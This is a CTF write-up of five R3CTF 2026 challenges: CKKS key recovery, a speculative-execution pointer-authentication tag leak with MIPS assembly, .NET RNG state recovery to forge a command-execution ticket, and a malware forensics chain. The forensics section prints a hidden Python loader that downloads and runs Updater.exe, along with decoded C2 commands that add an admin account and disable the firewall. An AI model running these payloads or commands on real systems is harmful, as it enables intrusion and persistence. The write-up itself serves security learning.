---
来源: https://cybersecurityelite.com/ctf-writeups/r3ctf-2026-writeup/
类型: html
获取日期: 2026-06-30
---

![R3CTF 2026 writeup — five challenges solved covering Microsoft SEAL CKKS delta recovery, MIPS64r6 pointer-authentication defeat via Spectre speculative PAC-gated load, .NET xoshiro256** state recovery via meet-in-the-middle, Lagrange-basis get_num oracle abuse via base-K polynomial decoding, and a multi-stage forensics chain from PyInstaller game to RDP bitmap cache MetaMask recovery](https://cybersecurityelite.com/images/articles/r3ctf-2026-writeup.png)Table of Contents

Five **R3CTF 2026** challenges are dissected here end to end. R3CTF 2026 is run by r3kapig, and the challenges reflect it: the crypto is a Microsoft SEAL CKKS server whose 240-bit modulus and 188-bit noise leak collapse under 95 approximate modular equations plus a baseline-noise filter; the misc is a full MIPS64r6 SoC in Verilog with a pointer-authentication gate that only fails to one committed mistake but bleeds tag bits through a Spectre-style speculative PAC-gated data-load timed against a cache probe; the two web challenges reduce to (a) recovering a shared .NET 8 `xoshiro256**` state from 160 leaked outputs via a GF(2) meet-in-the-middle over 34-bit slice choices, and (b) turning a Lagrange-interpolating `get_num(nums, index)` helper into a base-K polynomial decode that yields 128 linear equations in 128 unknown 16-bit secrets in a single oracle call; and the forensics is a five-stage chain from an encrypted beatmap containing marshalled Python bytecode through an `hh.exe`-dictionary-encoded C2 transcript to an RDP bitmap cache whose reconstructed tiles show a MetaMask recovery phrase on screen.

This is the master writeup covering all five challenges. Handouts, per-challenge READMEs, and full solver scripts live at [Abdelkad3r/R3CTF-2026](https://github.com/Abdelkad3r/R3CTF-2026). Every one of these solves is more than a “one XOR” gimmick. They are the sort of exploits where the shortest path is still a couple of hundred lines of Python plus a C++ helper for the tight loop, and the win comes from correctly identifying which classical primitive the challenge author has hidden under a modern wrapper (SEAL, CKKS, `xoshiro256**`, Lagrange bases, PAC, RDP bitmap caches).

## The five R3CTF 2026 challenges[#](#the-five-r3ctf-2026-challenges)

| Challenge | Category | Bug class / primitive | Flag |
| --- | --- | --- | --- |
| HEuristic | Crypto | Microsoft SEAL CKKS server multiplies plaintext coefficients by secret `delta` in every RNS limb, decrypts, and leaks the first 96 composed coefficients with ~188 bits of additive noise (modulus is ~240 bits). Baseline `q/2` plaintext + 95 `q/2 + 2^e` slots give 95 modular approximate equations `2^e · delta ≈ d_e (mod q)` with `|error| < 2B`. Interval refinement narrows to ~3 candidates; a baseline-noise filter (`noise_0` shared across every equation) picks the exact `delta`. | `r3ctf{H3URistIC-De1T@-15-H1dDen-iN-fu1LY_h0mom0rPh1C_encryption_schemes0}` |
| Blinky | Misc (hardware) | MIPS64r6 soft-core with pointer authentication. Flag routine at `0x2030` in the kernel region; user-mode indirect jumps into kernel space go through an 8-bit-tag PAC gate that locks after one committed fault. Side channel: a PAC-gated data-load on the wrong speculative path suppresses the fault for bad tags but touches `PAC_PROBE_ADDR` for good tags. Train a same-BHT-index alias branch as not-taken so the oracle branch mispredicts; time the probe line to distinguish cache hit vs miss; iterate all 256 tags without committing a single PAC fault. | `r3ctf{seCur3_aNaIy2Ing_p3rFOrmanc3_wOrkflOw4124}` |
| mafuyuuuuu | Web (ASP.NET) | `System.Random` shared between `POST /api/desk/posts` (returns `id` and `csp` as base64-encoded decimal strings of `Random.Next(0, 2^31-1)`) and a `debug(ticket, command)` template function that runs shell commands if the ticket matches the next RNG value. Collect 160 near-consecutive leaks (80 posts × 2 fields, pipelined over one socket). .NET 8 uses `xoshiro256**`; invert `Next(0, 2^31-1)` bounded reduction to get 76 possible 34-bit slices of `s1` per leak; MITM on 9 outputs recovers the 256-bit state. Fire 48 debug attempts with predicted indices `4*t` to cover the health-probe RNG advance. | `r3ctf{0tomE_K4iBOU-d3_@so6Ou-Yo_DokidoKl-sHit@1-J@N_Ka_dare_datte_congrats_finding_the_correct_solution0}` |
| r3ticket | Web (Python) | 128 secret 16-bit ints. `get_num(nums, index)` is a Lagrange-interpolating helper that returns `nums[index]` for `0 ≤ index ≤ 127`, blocks larger positive indices, but doesn’t block negative ones. For `index = -K`, the output is a known linear combination `sum coeff_i(K) · nums[i]` with denominators dividing `127!`. Multiply the response by `D = 127!` to get an integer polynomial in base `K`; balanced-remainder decode yields 128 equations in 128 unknowns. Rank 127 mod 1000003 leaves a 1-D nullspace; enumerate one coordinate 0-65535 and pick the point where all 128 fit in 16 bits. Then log-sum-exp scan over 2^24 candidates recovers each round’s exponent. | `r3ctf{H0pE_y0u_1ovE-THIS_tICKet-SErlEs-XD58c5c}` |
| Tsuki’s Rhythm Game | Forensics | Five-stage chain. PyInstaller rhythm game loads AES-encrypted beatmaps (hardcoded `KEY = b"TsukiRhythmKey!!"`, `IV = b"TsukiRhythmIV!!!"`). Malicious chart has type-99 notes encoding marshalled Python bytecode; the `advanced_stats` mod patches `custom_compare` to download `Updater.exe` from the local network. C2 protocol: first message is `hh.exe` XORed with `13 37 c0 de`; subsequent messages are dot-separated integers indexing into `hh.exe`’s first-occurrence-per-byte dictionary, wrapping AES-128-CBC `key |  |

The pattern that ties the event together: every challenge dresses a classical primitive in a modern wrapper. FHE + CKKS on top of “return the delta”; MIPS64 + PAC on top of “call an address”; .NET 8 `xoshiro256**` on top of “guess my ticket”; Lagrange bases on top of “read one array element”; RDP bitmap caching on top of “recover the recovery phrase.” Recognising the primitive is the whole game; the exploit is always a Python solver of at most a few dozen lines of top-level logic (with a C++ helper for the tight loop in mafuyuuuuu and r3ticket).

## Methodology — recognise the primitive, then treat noise as a lattice[#](#methodology--recognise-the-primitive-then-treat-noise-as-a-lattice)

A pattern that worked across the crypto and web challenges: whenever the observable is a small noisy image of a large unknown, the exploit is a lattice or an equivalent interval-refinement / meet-in-the-middle procedure. HEuristic’s 95 approximate modular equations reduce to interval refinement over `delta ∈ [1, q)`. mafuyuuuuu’s 306 GF(2) equations from 9 leaked outputs reduce to a MITM on parity syndromes. r3ticket’s 128 linear equations mod 1000003 with rank 127 reduce to a 1-D nullspace enumeration bounded by the 16-bit secret range. Each of these is the same idea in different clothes: convert the noisy oracle into linear structure over integers or GF(2), then let algebra finish.

For Blinky and Tsuki’s the pattern is different but equally repeated: identify the *primitive* that the surface component actually is (a Spectre-style speculative data-load; an RDP session recording), and then use the corresponding standard tool (BHT-alias training + cache timing; ANSSI `bmc-tools`) to extract the payload. In both cases, the challenge’s obfuscation is heavy in modern jargon (SEAL, PAC, xoshiro, marshalled bytecode) but the win comes from naming the classical shape and reaching for its standard exploit.

Per-challenge walkthroughs follow.

## 1. HEuristic[#](#1-heuristic)

A Microsoft SEAL CKKS server. Fresh keypair per connection, random `delta` mod `q` (product of five 48-bit RNS moduli, so `q` is ~240 bits). We’re allowed to encrypt one plaintext, decrypt an arbitrary ciphertext and read back the first 96 composed coefficients with ~188 bits of additive noise, then submit a guess for `delta`.

#### Step 1 — Read the leak equation[#](#step-1--read-the-leak-equation)

The server builds plaintexts manually:

```
plain[i + j * coeff_count] = coeff_i * delta mod q_j;
```

then NTT-encodes, encrypts, and lets us decrypt. Decryption does inverse NTT + RNS composition, then leaks the first 96 composed coefficients with:

```
cpp_int noise_bound = cpp_int(5) << 185;   // B ≈ 2^187.3
```

So for each chosen coefficient `m_i` we observe:

```
leak_i = m_i · delta + noise_i mod q,   |noise_i| < B
```

`q` is ~240 bits, `B` is ~188 bits, so each leak carries roughly 52 bits of information about `delta`. Way more than enough for 95 samples.

#### Step 2 — Pick a valid plaintext set[#](#step-2--pick-a-valid-plaintext-set)

The plaintext-coefficient check rejects anything with absolute representative below `q/8`:

```
cpp_int abs_coeff = reduced > q / 2 ? q - reduced : reduced;
if (abs_coeff < q / 8) throw std::invalid_argument("bad plaintext");
```

Baseline `q/2` passes cleanly and is convenient because it’s the largest allowed value. Additional slots use `q/2 + 2^e` (still close to `q/2`, still passes):

```
base = q // 2
exponents = [e for e in range(0, 192, 2) if e != 74]
```

95 exponents chosen to spread out over 0..192 bits.

#### Step 3 — Cancel the baseline with a subtraction[#](#step-3--cancel-the-baseline-with-a-subtraction)

The first leaked slot is:

```
leak_0 = base · delta + noise_0 mod q
```

The e-th slot is:

```
leak_e = (base + 2^e) · delta + noise_e mod q
```

Differencing kills the large `base · delta` term:

```
d_e = leak_e - leak_0 mod q = 2^e · delta + (noise_e - noise_0) mod q
```

with `|noise_e - noise_0| < 2B`. 95 approximate modular equations for the same unknown `delta`.

#### Step 4 — Interval refinement[#](#step-4--interval-refinement)

Each equation says `2^e · delta mod q` is within `2B` of `d_e`. Starting from `[1, q)`, intersect the current candidate interval `[L, H]` with the inverse image of `[d_e - 2B, d_e + 2B]` under multiplication by `2^e`:

```
2^e · L ≤ 2^e · delta ≤ 2^e · H
2^e · delta = k · q + residue,   residue ∈ [d_e - 2B, d_e + 2B]
```

Enumerate the small number of wrap counts `k`, compute the narrowed interval:

```
ceil((k · q + residue_low) / 2^e) ≤ delta ≤ floor((k · q + residue_high) / 2^e)
```

After all 95 constraints, the candidate set collapses to a few adjacent integers (three in the live solve).

#### Step 5 — Baseline-noise filter picks the survivor[#](#step-5--baseline-noise-filter-picks-the-survivor)

The 2B bound is conservative because each `d_e` contains `noise_e - noise_0`, and `noise_0` is *the same* across every equation. For a candidate `delta`, compute the centered residuals:

```
r_e = centered(d_e - 2^e · delta mod q)
```

For the candidate to be consistent, there must exist a single `noise_0` such that `-B ≤ r_e + noise_0 ≤ B` for every `e`. That’s an interval intersection:

```
-B - r_e ≤ noise_0 ≤ B - r_e
```

The true `delta` leaves a non-empty intersection; adjacent wrong candidates don’t. In the live solve, three interval-refinement survivors reduced to exactly one via this filter.

Live output:

```
[+] q = 6277101715473810179849235372514429772715831797744269418497
[+] ciphertext length = 262257
[+] got 96 leaked coefficients
[+] interval candidates: 3
[+] valid candidates: 1
[+] delta = 489875397824812687386690722568094443641738882699142192426
```

Submit `delta`; server returns the flag. Per-challenge README + solver: [crypto/HEuristic](https://github.com/Abdelkad3r/R3CTF-2026/tree/master/crypto/HEuristic).

The flag payload `H3URistIC-De1T@-15-H1dDen-iN-fu1LY_h0mom0rPh1C_encryption_schemes0` labels the class exactly: the “heuristic delta is hidden in fully homomorphic encryption schemes.” The bug is not in SEAL itself; it is in the challenge author’s choice to leak more bits of the encrypted state than the noise budget hides. Any FHE library that faithfully implements CKKS is only as safe as the application’s decision about what to reveal.

## 2. Blinky[#](#2-blinky)

A complete RTL model of a MIPS64r6 SoC. Kernel exposes `print_flag` at `0x2030`. User code loaded at `0x0`, must stay below `0x2000`. Direct kernel jumps are blocked by pointer authentication; one committed PAC fault locks the gate for the rest of the run, so architectural brute-force over the 256 possible 8-bit tags is off the table.

#### Step 1 — Read the PAC gate[#](#step-1--read-the-pac-gate)

`rtl/modules/core_branch.sv` gates user-to-kernel `jr`:

```
assign pac_va         = {{`PAC_TAG_BITS{1'b0}}, forwarded_A[63-`PAC_TAG_BITS:0]};
assign pac_tgt_kernel = (pac_va >= `PAC_KERNEL_BASE) && (pac_va < `PAC_KERNEL_END);
assign pac_cross      = !kernel_mode && pac_tgt_kernel;
```

A committed cross with the wrong tag raises a PAC fault. `cp0.sv` counts them:

```
assign pac_locked = (pac_fault_count >= `PAC_FAULT_LIMIT);
```

`PAC_FAULT_LIMIT = 1` in this build, so one loud bad guess locks us out permanently.

#### Step 2 — Find the side channel in the PAC-gated data-load[#](#step-2--find-the-side-channel-in-the-pac-gated-data-load)

`rtl/units/core_EX.sv` has a separate PAC-gated load path:

```
assign pac_ld_gated = (|ID_regs.mem_load_type) && (|ext_out[63:64-`PAC_TAG_BITS]);

assign pac_ld_addr  = (pac_ld_gated && pac_ld_ok) ? `PAC_PROBE_ADDR : ext_out;
assign pac_ld_fault = pac_ld_gated && !pac_ld_ok;
```

Good tag: load proceeds to `PAC_PROBE_ADDR`. Bad tag: NO\_LOAD + deferred PAC fault. The wrong-path handling matters:

```
assign drain_load = spec_squash && (|ID_regs.mem_load_type);
EX_regs.spec <= drain_load;
```

and CP0:

```
takenException = (|next_exc_code) && !spec;
```

Speculative squashed loads don’t commit exceptions. So on the wrong path, a bad-tag load suppresses the PAC fault, while a good-tag load touches `PAC_PROBE_ADDR` (`0x1000` in this build) and leaves a cache footprint. Time a normal load from `0x1000` afterwards to distinguish hit from miss.

#### Step 3 — Train a safe misprediction[#](#step-3--train-a-safe-misprediction)

The BHT indexes on PC bits:

```
rd_idx = pc[IDX_BITS+1:2];
```

Two branches whose PCs share the same 6-bit index alias in the predictor. Training the oracle branch itself as not-taken would be unsafe because its fall-through *is* the PAC-gated load and would execute architecturally. So the exploit places a harmless training branch at `0x40` and the real oracle branch at `0x140`; both hit BHT index `(0x40 >> 2) & 0x3F = 0x10` and `(0x140 >> 2) & 0x3F = 0x10`.

Training branch at `0x40` is always not taken:

```
.org 0x40
train_alias:
    bne  $zero, $zero, 1f
    nop
1:  jr   $ra
    nop
```

Oracle branch at `0x140` is actually taken:

```
.org 0x140
oracle_probe:
    bne  $zero, $s2, 1f
    lb   $9, 0($t0)      # wrong-path speculative PAC-gated load
1:  jr   $ra
    nop
```

`$t0` holds `(tag << 56) | 0x2030`, the candidate signed pointer.

#### Step 4 — Time the probe[#](#step-4--time-the-probe)

Before each attempt, invalidate both D-cache ways for the probe set:

```
cache 1, 0($s5)     # $s5 = 0x1000
dli  $t1, 0x1800
cache 1, 0($t1)
```

Train the alias four times, execute the oracle branch once, then time a normal load from `0x1000`:

```
lw   $t2, 0($s7)     # cycle counter before
lb   $9, 0($s5)      # probe load
lw   $t3, 0($s7)     # cycle counter after
dsub $v0, $t3, $t2
```

Local calibration on the dummy kernel:

```
bad tag  → 0x05 cycles
good tag → 0x02 cycles
bad tag  → 0x05 cycles
```

Threshold `sltiu $t3, $v0, 4`. Confirm with a second probe to reject noisy samples.

#### Step 5 — Iterate 256 tags and jump[#](#step-5--iterate-256-tags-and-jump)

```
for tag in 0..255:
    build signed = (tag << 56) | 0x2030
    invalidate probe set
    train alias branch not-taken
    execute mispredicted oracle branch
    time load from 0x1000
    if fast: confirm with second probe; if still fast, break
# no PAC faults committed anywhere in the loop

found:
    dsll $t0, $s0, 56
    ori  $t0, $t0, 0x2030
    jr   $t0
    nop
```

The confirmed `jr` authenticates cleanly, kernel mode is entered, `print_flag` runs.

```
$ curl --data-binary @exploit.mem http://challenge.ctf2026.r3kapig.com:32619/submit
r3ctf{seCur3_aNaIy2Ing_p3rFOrmanc3_wOrkflOw4124}
HALT
```

Per-challenge README + full MIPS assembly exploit + calibration payload: [misc/blinky](https://github.com/Abdelkad3r/R3CTF-2026/tree/master/misc/blinky).

The flag `seCur3_aNaIy2Ing_p3rFOrmanc3_wOrkflOw4124` (with `4124` reading as “Alan Turing’s year”) is a clear reference to Spectre-class attacks: any secure workflow that authenticates in the architectural path but leaves speculative execution unchecked leaks the authentication token through the microarchitectural state. In production silicon this is the exact shape of Spectre v1/v2/v4, of Meltdown, and of the LVI family. The mitigation in real hardware is either serialising the speculative window (`csdb`, `lfence`), tagging speculatively-touched cache lines separately, or gating the observable side effect on commit.

## 3. mafuyuuuuu[#](#3-mafuyuuuuu)

An ASP.NET Core template-rendering service. The template engine exposes a `debug(ticket, command)` function that runs a shell command if `ticket` matches the next `System.Random.Next(0, 2^31-1)` output. The same `Random` instance is also used by `POST /api/desk/posts`, which returns two consecutive RNG outputs as `id` and `csp` fields.

#### Step 1 — Read the shared-RNG bug[#](#step-1--read-the-shared-rng-bug)

`DebugLeaseService`:

```
private readonly Random _random = new Random();

public DebugLeaseToken IssuePostToken(string lane) {
    lock (_gate) {
        return new DebugLeaseToken(NextWeakBase64(), NextWeakBase64(), lane, ++_postCount);
    }
}

public string RunDebug(string ticket, string command) {
    string right;
    lock (_gate) { right = NextWeakBase64(); }
    if (!FixedEquals(ticket, right)) return "DebugDenied<...>";
    return RunCommand(command);
}

private string NextWeakBase64() {
    string text = _random.Next(0, 2147483647).ToString(CultureInfo.InvariantCulture);
    return Convert.ToBase64String(Encoding.ASCII.GetBytes(text));
}
```

`Random` is shared: `POST /api/desk/posts` consumes two outputs, `debug(ticket, command)` consumes one. If we can recover the RNG state from the posts leak, we can predict the debug ticket.

Template sandbox allows `debug` and lets `/readflag` through the command regex (no spaces, braces, commas, quotes, or shell metacharacters).

#### Step 2 — Collect 160 near-consecutive RNG outputs[#](#step-2--collect-160-near-consecutive-rng-outputs)

`collect_posts.py` pipelines 80 `POST /api/desk/posts` requests over one socket. Each response leaks two `Random.Next(0, 2^31-1)` values as base64-encoded ASCII decimal:

```
{"id":"NDQyOTA4NTQ=","csp":"MTIxMDA5NjczNw=="}
```

decoding to `44290854, 1210096737`. 160 near-consecutive outputs total.

#### Step 3 — Model the .NET 8 xoshiro256\*\*[#](#step-3--model-the-net-8-xoshiro256)

On .NET 8 x64, `System.Random` uses `xoshiro256**`:

```
result = rotl(s1 * 5, 7) * 9 mod 2^64
```

`Random.Next(0, 2^31-1)` takes the high 32 bits of `result` and applies .NET’s bounded reduction:

```
x = high32(result)
value = floor(2147483647 * x / 2^32)  # with small rejection for modulo bias
```

Direct SMT solving over the full generator was too slow. The working approach reduces each observed value into a small list of possible middle slices of `s1`, then solves the choices with linear algebra.

#### Step 4 — Invert each leak to 76 possible 34-bit slices of s1[#](#step-4--invert-each-leak-to-76-possible-34-bit-slices-of-s1)

For each observed `v`, invert the bounded integer reduction to get the possible high 32-bit values `x` of the xoshiro output. The starstar output is `y = rotl(s1 · 5, 7) · 9 mod 2^64`. Only `high32(y)` is constrained by `v`.

Peeling back the multiplication by 9 mod `2^32` with all possible carry values, undoing the rotate, and inverting the multiply-by-5 relationship gives 76 possible 34-bit slices `s1[23..56]` per leak.

#### Step 5 — Meet-in-the-middle over 9 outputs[#](#step-5--meet-in-the-middle-over-9-outputs)

The xoshiro state transition is linear over GF(2), so each bit of each future `s1[23..56]` slice is a linear form in the initial 256-bit state.

For the first 9 leaked outputs:

```
9 outputs × 34 slice bits = 306 equations, rank 256
→ 50 parity dependencies that valid slice choices must satisfy
```

Instead of `76^9 ≈ 10^17` combinations, `mitm9.cpp` does a MITM:

1. Build 50-bit parity contributions for every candidate slice of each output.
2. Enumerate outputs 4-7 (76^4 ≈ 33M combos), bucket XOR syndromes by low 24 bits.
3. Enumerate outputs 0-3 + output 8 (76^5 ≈ 2.5B combos), look for matching zero syndrome.
4. For each hit, lift chosen slices into a GF(2) basis and validate against all 160 leaked outputs.

Live solve produced 22 slice-choice hits; only one lifted state reproduced the full leak sequence:

```
state = 0x42e7c89e737017fb 0x225e34e6fd3fed 0x9a0243c9ae705551 0xa8a487047974e27a
```

#### Step 6 — Handle the health probe[#](#step-6--handle-the-health-probe)

`InternalHealthProbeService` starts 3 seconds after boot, then calls `/healthz` every 5 seconds. Each probe consumes 3 RNG values via `RecordHealthProbe`. By the time the solver has finished MITM (~20s) and submits the debug template, the RNG has advanced by some multiple of 3 that depends on wall-clock timing.

The sandbox allows up to 48 output expressions per template. Fire 48 debug attempts with predicted indices `4*t`:

```
call t consumes predicted index: 3*t (health) + t (previous failed debug ticks) = 4*t
```

One of them lands on the correct current RNG position and executes `/readflag`.

Live output:

```
collected 160 values in 1.27s
mitm hits 22 at 19.97s
state 0x42e7c89e737017fb 0x225e34e6fd3fed 0x9a0243c9ae705551 0xa8a487047974e27a
...
r3ctf{0tomE_K4iBOU-d3_@so6Ou-Yo_DokidoKl-sHit@1-J@N_Ka_dare_datte_congrats_finding_the_correct_solution0}
```

Per-challenge README + C++ MITM helper + Python driver: [web/mafuyuuuuu](https://github.com/Abdelkad3r/R3CTF-2026/tree/master/web/mafuyuuuuu).

The takeaway generalises across every framework that ships a fast non-cryptographic PRNG: `xoshiro256**` (.NET 8), `PCG64` (Python 3.11+), `xoshiro128++` (Java 17), all mixed with a small bounded-integer reduction. Any state one can serialise, one can recover from enough public outputs, and any code path that treats a Random output as an unpredictable secret is a state-recovery attack waiting to happen. Use `RandomNumberGenerator` / `secrets.token_bytes` for anything that gates authorisation.

## 4. r3ticket[#](#4-r3ticket)

The server generates 128 secret 16-bit integers. It exposes one query to a `get_num(nums, index)` helper, then runs 16 timed rounds where each round prints the first 64 decimal digits of `sum(num**x for num in nums)` and demands the 24-bit exponent `x` within three seconds. The intended pitch is “you get one oracle question, then you need magic.” The reality is that `get_num` at a large negative index is a lot more oracle than you’d expect.

#### Step 1 — Recognise the Lagrange basis[#](#step-1--recognise-the-lagrange-basis)

```
def get_num(nums, index):
    if index > len(nums) - 1:
        return 0
    result = 0
    for i in range(len(nums)):
        part = 1
        for j in range(len(nums)):
            if j == i: continue
            part *= (index - j) // (i - j)
        result += part * nums[i]
    return result
```

This is a Lagrange interpolation basis: for integer `index` in `[0, 127]`, `part` selects `nums[index]` and everything else zeros out. The `index > 127` block cuts off the positive side, but negative indices sail past. For `index = -K`:

```
get_num(nums, -K) = sum_i L_i(-K) · nums[i]
```

where `L_i(-K) = prod_{j != i} (-K - j) / (i - j)` is a known rational function of `K`.

#### Step 2 — Clear denominators with 127![#](#step-2--clear-denominators-with-127)

The denominator of `L_i` is `i! · (127 - i)!`, and every such divisor divides `D = 127!`. So `D · L_i(-K)` is an integer polynomial in `K`. Sum-of-integer-polynomials:

```
D · get_num(nums, -K) = C_0 + C_1 · K + C_2 · K^2 + ... + C_127 · K^127
```

Each coefficient `C_k` is a *linear* combination of the 128 unknown `nums[i]` values:

```
C_k = sum_i A[k][i] · nums[i]
```

We know every `A[k][i]`; they come from expanding the Lagrange basis in `K`.

#### Step 3 — Pick K large enough for base-K decoding[#](#step-3--pick-k-large-enough-for-base-k-decoding)

The base-K decode `q, r = divmod(y, K)` recovers the digit `C_0 = r` only if `|C_0| < K/2`. For the whole polynomial to unpack cleanly (with balanced remainders for signed coefficients), `K` must exceed the largest possible `|C_k|`. The largest coefficients live in `A[k][i]` when `i, k` are near 64; for 128 unknown 16-bit values that gives a bound around 350 decimal digits. The solver uses:

```
K = 100000000000000000000000000000000000000000000000000622678012454356204293514999205755658805414260295057845512552239870413423013129403499949722561439301712333601575272862024896819218528045733392920106428700529925748763061525020476946675393607002282962963347971984000062862494407370830390867359675701684109692649742472103974478338152114326918580858146449
```

351 decimal digits. Large enough for carry-free decoding, small enough that the server computes `get_num(nums, -K)` quickly enough to answer within the timeout window.

#### Step 4 — Balanced-remainder decode[#](#step-4--balanced-remainder-decode)

Query `-K`, multiply the response by `D`, extract 128 balanced remainders:

```
q = oracle_value * D
coeffs = []
for _ in range(128):
    r = q % K
    if r > K // 2:
        r -= K
    coeffs.append(r)
    q = (q - r) // K
```

That gives 128 linear equations `C_k = sum_i A[k][i] · nums[i]` in the 128 unknowns.

#### Step 5 — Solve with a small nullspace trick[#](#step-5--solve-with-a-small-nullspace-trick)

The 128 × 128 matrix `A` has rank 127 mod 1000003 (a working prime for the challenge), so there’s a 1-D solution space. But every `nums[i]` is a 16-bit value in `[0, 65535]`. Enumerate one coordinate from 0 to 65535 along the nullspace line and keep the unique point where all 128 coordinates fit in 16 bits. That recovers all 128 secrets from the single oracle query.

#### Step 6 — Log-sum-exp scan for each round’s exponent[#](#step-6--log-sum-exp-scan-for-each-rounds-exponent)

Once `nums` is known, each round asks us to invert:

```
prefix = first_64_digits(sum(num_i^x))
```

for a 24-bit `x`. Computing every `sum` for every `x` is too slow and blows up integer sizes. Work in decimal logarithms instead:

```
H(x) = sum_i num_i^x
log10(H(x)) determines the leading digits
```

`scan_exp.cpp` scans all 2^24 exponents. First filter using the largest recovered secret:

```
log10(count_max) + x · log10(max_num)
```

For each candidate, compute stable log-sum-exp:

```
m = max_i(x · log10(num_i))
log10(H(x)) = m + log10(sum_i 10^(x · log10(num_i) - m))
```

Match against the 64-digit target mantissa. Each round produces a unique candidate at tolerance `1e-8`, completing well within the 3-second timeout.

```
You won! Here is your real ticket: r3ctf{H0pE_y0u_1ovE-THIS_tICKet-SErlEs-XD58c5c}
```

Per-challenge README + Python solver + C++ scanner: [web/r3ticket](https://github.com/Abdelkad3r/R3CTF-2026/tree/master/web/r3ticket).

The r3ticket trick is the Lagrange-basis version of the same pattern that shows up in classical polynomial-secret-sharing attacks: any evaluation of a polynomial at a value outside its intended domain leaks a linear combination of the coefficients, and enough evaluations at cleverly chosen points reconstruct them. Here a *single* evaluation at one enormous point is enough because base-K decoding turns one big integer into 128 small ones for free.

## 5. Tsuki’s Rhythm Game[#](#5-tsukis-rhythm-game)

An incident-response chain spread across a game folder, a packet capture, and a password-protected evidence archive. The end goal is a wallet address derived from a MetaMask recovery phrase, but the path there runs through PyInstaller extraction, Python-marshal bytecode decoding, a custom C2 protocol using `hh.exe` as an encoding dictionary, and RDP bitmap-cache reconstruction.

#### Step 1 — Unpack the game and decrypt beatmaps[#](#step-1--unpack-the-game-and-decrypt-beatmaps)

`TsukiRhythmGame.exe` is PyInstaller-packed. Extract the Python code and read the chart loader; beatmaps are AES-CBC encrypted with hardcoded key/IV:

```
KEY = b"TsukiRhythmKey!!"
IV  = b"TsukiRhythmIV!!!"
```

Instance answer for that part: `TsukiRhythmKey!!_TsukiRhythmIV!!!`.

#### Step 2 — Extract marshalled bytecode from Eggdrasil.tsuki[#](#step-2--extract-marshalled-bytecode-from-eggdrasiltsuki)

Decrypting the five charts, `Eggdrasil.tsuki` stands out: most notes are normal gameplay, but many use `type == 99`. The `advanced_stats.tsukimod` mod contains code that collects those type-99 notes, packs each note’s lane into 2 bits, and feeds the concatenated bytes to `marshal.loads`.

The recovered function is `custom_compare`. Disassembling it:

```
def custom_compare(self, other):
    try:
        import urllib.request as urllib
        import os, subprocess
        url = "http://192.168.117.1:8000/Updater.exe"
        temp_path = os.path.join(os.environ.get("TEMP", "."), "Updater.exe")
        urllib.request.urlretrieve(url, temp_path)
        subprocess.Popen([temp_path], shell=True)
    except: pass
    return self.score < other.score
```

Hidden C2 loader that downloads and runs `Updater.exe` from the local network. MD5 of the marshalled bytecode: `aed1e4e8b9061e19506848ca579e46ac`.

#### Step 3 — Extract Updater.exe and reverse the C2 protocol[#](#step-3--extract-updaterexe-and-reverse-the-c2-protocol)

`tshark --export-objects http` recovers `Updater.exe` from the capture. The malware connects to `192.168.117.1:4444`. TCP conversation between `192.168.117.135:56761 → 192.168.117.1:4444` in the pcap.

The first client-to-server message is *not* dot-encoded. XORing with `13 37 c0 de` produces a valid PE file:

```
hh = bytes(b ^ b"\x13\x37\xc0\xde"[i % 4] for i, b in enumerate(first_message))
```

Recovered file is `C:\Windows\hh.exe` (MD5 `2c8fe78d53c8ca27523a71dfd2938241`). Not gratuitous exfiltration: the C2 encoder builds a dictionary from `hh.exe`:

```
byte value → first offset where that byte appears in hh.exe
```

Bytes not present in `hh.exe` are transmitted as negative integer escapes (`hh.exe` contains 248 of 256 possible byte values; the remaining 8 show up in traffic as negatives).

#### Step 4 — Decode C2 messages[#](#step-4--decode-c2-messages)

Each subsequent packet is dot-separated integers:

```
1. split on '.'
2. positive int → look up that offset in the reconstructed dictionary
3. negative int → decode as abs(value) (a byte not in hh.exe)
4. resulting bytes = 16-byte key || AES-128-CBC ciphertext || 16-byte IV
5. AES-128-CBC decrypt with PKCS#7 padding
```

Server commands decoded:

```
ipconfig /all
whoami
dir
tasklist
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
net user aurahack P@ssw0rd /add
net localgroup Administrators aurahack /add
netsh firewall set opmode disable
```

`whoami` response: `desktop-gb98l3m\tsuki`. Attacker-created account: `aurahack_P@ssw0rd`.

Answering those questions on the instance unlocks the password for `Evidence.zip`: `18ae3a54-1c1a-4f44-adca-9884acb80d9a`.

#### Step 5 — Recover the MetaMask recovery phrase from the RDP bitmap cache[#](#step-5--recover-the-metamask-recovery-phrase-from-the-rdp-bitmap-cache)

```
7z x -p'18ae3a54-1c1a-4f44-adca-9884acb80d9a' Evidence.zip
# extracts Cache0000.bin
```

File starts with `RDP8bmp`, an RDP bitmap cache, not a browser or wallet database. Use ANSSI’s `bmc-tools` to extract tiles and collage them:

```
git clone https://github.com/ANSSI-FR/bmc-tools.git
python3 bmc-tools/bmc-tools.py -s Evidence_extracted -d rdp_tiles -b -v
```

2,943 tiles reconstructed. The visible MetaMask recovery phrase reads:

```
labor trophy emerge material divorce input faint bench cricket merge sunset cream
```

7th word: `faint`, one of the instance answers.

#### Step 6 — Derive the first Ethereum account[#](#step-6--derive-the-first-ethereum-account)

MetaMask uses `m/44'/60'/0'/0/0`. Foundry’s `cast`:

```
cast wallet derive 'labor trophy emerge material divorce input faint bench cricket merge sunset cream' --accounts 1
# Address: 0x27A2481a2D840C64c1f6a99842E1A63A1586237e
```

Submit the wallet address; instance returns `r3ctf{f1n@1Iy-yOU_f1nD_tHE_S3CR3t_6EHiND_rHytHM-4Nd-Tr4c3_them0}`.

Per-challenge README + C2 solver + recovery-phrase RDP cache screenshot: [forensics/tsukis-rhythm-game](https://github.com/Abdelkad3r/R3CTF-2026/tree/master/forensics/tsukis-rhythm-game).

The forensics chain works because every stage’s output is exactly the input the next stage needs: the marshalled bytecode names the C2 host and port; `hh.exe` is the encoding dictionary that makes the C2 transcript decodable; the transcript answers the instance quiz that hands out the ZIP password; the ZIP holds an RDP cache whose visible glyphs are the seed phrase. The RDP bitmap-cache primitive is the newest piece of that toolkit, worth internalising because it turns any recording of an attacker’s RDP session into a screen capture through `bmc-tools`.

## Cross-cutting defender notes[#](#cross-cutting-defender-notes)

Five patterns recur across R3CTF 2026 and translate directly into review heuristics.

